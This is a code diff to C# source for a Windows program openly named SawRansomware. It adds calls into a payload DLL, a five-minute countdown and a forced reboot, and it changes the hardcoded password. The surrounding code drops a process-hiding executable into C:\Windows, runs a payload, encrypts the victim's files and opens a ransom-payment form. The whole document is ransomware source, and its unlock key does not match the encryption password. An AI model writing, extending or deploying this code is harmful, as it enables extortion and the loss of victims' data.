@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -13,11 +13,18 @@ using System.IO; //Add This
 using System.Diagnostics; //Add This
 using System.Media; //Add This
 using System.Reflection; //Add This
+using System.Runtime.InteropServices;
 
 namespace SawRansomware
 {
     public partial class SawRansomware : Form
     {
+        [DllImport(@"SawRansomwareLib.dll")]
+        public static extern int SawRansomware_Payload();
+
+        [DllImport(@"SawRansomwareLib.dll")]
+        public static extern int DestroyWindow_SawRansomware();
+
         SoundPlayer saw;
 
         public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
@@ -38,10 +45,16 @@ namespace SawRansomware
             Directory.CreateDirectory(@"C:\Temp\Saw");
             Extract("SawRansomware", @"C:\Temp\Saw", "Resources", "SawRansomware.wav");
             Extract("SawRansomware", @"C:\Windows", "Resources", "ProcessHider.exe");
-            Extract("SawRansomware", @"C:\Windows", "Resources", "SawRansomwarePayload.exe");
+            Extract("SawRansomware", @"C:\Temp\Saw", "Resources", "SawRansomwarePayload.exe");
             Process.Start(@"C:\Temp\Saw\SawRansomwarePayload.exe");
             saw = new SoundPlayer(@"C:\Temp\Saw\SawRansomware.wav");
             saw.PlayLooping();
+            var start = DateTime.Now;
+            var sawtimer = new Timer() { Interval = 1000 };
+            sawtimer.Tick += (obj, args) =>
+            sawtimerlabel.Text = (TimeSpan.FromMinutes(5) - (DateTime.Now - start)).ToString("hh\\:mm\\:ss");
+            sawtimer.Enabled = true;
+            SawRansomware_Payload();
         }
 
         private void unlockbutton_Click(object sender, EventArgs e)
@@ -49,8 +62,9 @@ namespace SawRansomware
             if(textBox1.Text == "")
             {
                 MessageBox.Show("WRONG KEY!!!", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                DestroyWindow_SawRansomware();
             }
-            else if(textBox1.Text == "SawRans8549319VHURENOV123")
+            else if(textBox1.Text == "SawRans8549319HUGGER23")
             {
                 MessageBox.Show("Key is Correct...", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 Environment.Exit(-55632);
@@ -58,6 +72,7 @@ namespace SawRansomware
             else
             {
                 MessageBox.Show("WRONG KEY!!!", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                DestroyWindow_SawRansomware();
             }
         }
 
@@ -88,7 +103,7 @@ namespace SawRansomware
 
             EncryptSawRansomware enc = new EncryptSawRansomware();
 
-            string password = "SawRans8549319VHURENOV123"; 
+            string password = "SawRans8549319HUGGER123"; 
             for (int i = 0; i < files.Length; i++)
             {
                 enc.FileEncrypt(files[i], password);
@@ -104,6 +119,16 @@ namespace SawRansomware
         {
             var mxz = new SawPayForm();
             mxz.ShowDialog();
+        }
+
+        private void sawtimer_Tick(object sender, EventArgs e)
+        {
+            if(sawtimer.Interval < 1)
+            {
+                MessageBox.Show("Time is Up... Say Goodbye to your PC", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Process.Start("shutdown", "/r /t 30");
+                Environment.Exit(-6654);
+            }
         }
     }
 }
